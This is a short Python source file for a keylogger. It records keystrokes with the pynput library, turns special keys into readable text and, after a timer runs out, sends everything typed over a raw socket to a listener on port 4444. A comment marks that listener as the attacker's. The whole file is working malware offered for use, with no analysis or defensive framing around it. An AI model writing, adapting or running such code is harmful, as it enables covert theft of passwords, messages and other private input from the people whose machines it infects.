from pynput.keyboard import Listener
from threading import Thread
import time
import socket

s = socket.socket()
# Insert target's IP and PORT below.
s.connect(('127.0.0.1', 4444))

# Formats the typed text.
typed = ''

def monitor(key):
    global typed
    key = str(key)
    # Formats numbers and text.
    if "'" in key:
        key = key.replace("'", '')
    
    # Formats special keys.
    else:
        key = key.replace(key[:4], '')
        translate = {'space':' ', '<96>':'0', '<97>':'1', '<98>':'2', '<99>':'3', '<100>':'4', '<101>':'5', '<102>':'6', '<103>':'7', '<104>':'8', '<105>':'9'}
        if key in translate:
            key = translate[key]
        elif key == 'backspace':
            typed = typed[:-1]
            return
        else:
            try:
                key = f" [{key[0].upper()}{key[1:]}] "
            except:
                key = ' [some numpad key] '

    # Adds the formated key if its [Enter]
    typed += key


# Sends all the information to the attacker.
while True:
    with Listener(on_press=monitor) as ls:
        def time_out(minutos: int):
            # Listens to keyboard for period_sec seconds
            time.sleep(60 * minutos)  
            ls.stop()
            s.send(bytes(typed, 'utf-8'))
            s.close()
            

        Thread(target=time_out, args=(0.2,)).start()
        typed = ''
        ls.join()
        exit()
